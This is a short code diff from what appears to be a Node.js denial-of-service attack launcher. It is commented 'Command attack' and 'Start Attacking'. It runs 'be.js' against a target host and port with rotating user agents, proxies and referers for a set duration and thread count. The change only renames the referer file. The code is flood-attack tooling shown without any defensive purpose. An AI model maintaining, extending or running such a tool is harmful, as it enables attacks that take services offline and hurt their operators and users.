@@ -26,7 +26,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node be.js ${host} ${port} useragents.txt ${duration} ${thread} proxy.txt referers.txt`, (error, stdout, stderr) => {
+exec(`node be.js ${host} ${port} useragents.txt ${duration} ${thread} proxy.txt referer.txt`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
